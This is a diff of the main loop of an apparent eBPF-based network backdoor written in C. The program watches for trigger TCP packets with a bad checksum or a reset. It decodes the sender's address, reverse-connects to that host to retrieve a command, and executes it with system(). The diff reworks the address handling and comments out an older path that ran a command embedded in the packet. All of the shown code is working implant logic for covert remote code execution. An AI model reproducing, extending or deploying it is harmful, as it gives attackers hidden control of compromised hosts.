@@ -330,22 +330,42 @@ int main(int argc, char **argv) {
   while (1) {
     err = ring_buffer__poll(rb, 100);
     if (err != 0) {
-      //
+      // Ignore errors for PID events
     }
     // =========================================================================
     // Boop map management
     //
     int ikey = 0, jkey;
     int err;
+
     char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
-    struct encapsulated_tcp_boop ret;
+    __u8 saddrbytes[4];
+
+    struct event_boop_t ret;
     while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
       err = bpf_map_lookup_elem(fd, &jkey, &ret);
       if (err < 0) {
         continue;
       }
       ignore = 0;
-      inet_ntop(AF_INET, &ret.saddrval, saddrval, sizeof(saddrval));
+
+      // Arrange the saddrval bytes from the kernel
+      if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
+        boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
+        char saddrval6[INET6_ADDRSTRLEN];
+        // Hacky translation system to get the bytes rendered
+        inet_ntop(AF_INET6, ret.saddr, saddrval6, INET6_ADDRSTRLEN);
+        printf("%s\n", saddrval6);
+        inet_pton(AF_INET, saddrval6, saddrbytes);
+      }else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
+        boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
+        memcpy(saddrbytes,ret.saddr,sizeof saddrbytes);
+      }
+
+      // Calculate saddrval once and for all
+      inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));
+
+
       for (int i = 0; i < cfg.denyc; i++) {
         if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
           // Ignoring string in deny list
@@ -354,10 +374,8 @@ int main(int argc, char **argv) {
         }
       }
       if (!ignore) {
-        boopprintf("  ** Boop: %s\n", saddrval);
-        // If no RCE is found in the initial boop, and we are running
-        // in !localonly mode:
-        if (strlen(ret.rce) == 0 && !cfg.localonly) {
+        // TODO Parse RCE from map/encapsulation and check here
+        if (!cfg.localonly) {
           boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
           char *rce = malloc(MAX_RCE_SIZE);
           int retval;
@@ -367,10 +385,11 @@ int main(int argc, char **argv) {
             system(rce);
           }
           free(rce);
-        } else if (strlen(ret.rce) > 0) {
-          boopprintf("  <- Executing: %s\r\n", ret.rce);
-          system(ret.rce);
-          boopprintf("  -> no RCE found!\n");
+        } else  {
+          // TODO Parse RCE from map/encapsulation
+          //boopprintf("  <- Executing: %s\r\n", ret.rce);
+          //system(ret.rce);
+          //boopprintf("  -> no RCE found!\n");
         }
       }
       err = bpf_map_delete_elem(fd, &jkey);
@@ -381,3 +400,5 @@ int main(int argc, char **argv) {
     }
   }
 }
+
+
